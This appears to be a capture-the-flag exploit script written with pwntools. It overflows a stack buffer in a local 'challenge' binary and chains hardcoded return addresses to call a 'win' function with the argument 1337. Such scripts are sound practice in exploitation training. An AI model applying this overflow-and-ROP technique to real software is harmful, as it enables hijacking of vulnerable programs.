import pwn

p = pwn.process("./challenge")
#p = pwn.process(["gdb", "./challenge"])

payload = (b'a' * 120  # 100 bytes + 12 bytes padding + 8 for rbp
        + pwn.p64(0x401166)  # setopen
        + pwn.p64(0x401226)  # helper
        + pwn.p64(1337)       # argument for win()
        + pwn.p64(0x401174))  # win
#p.sendline("b *main+122")
#p.sendline("r")
p.sendline(payload)

p.interactive()
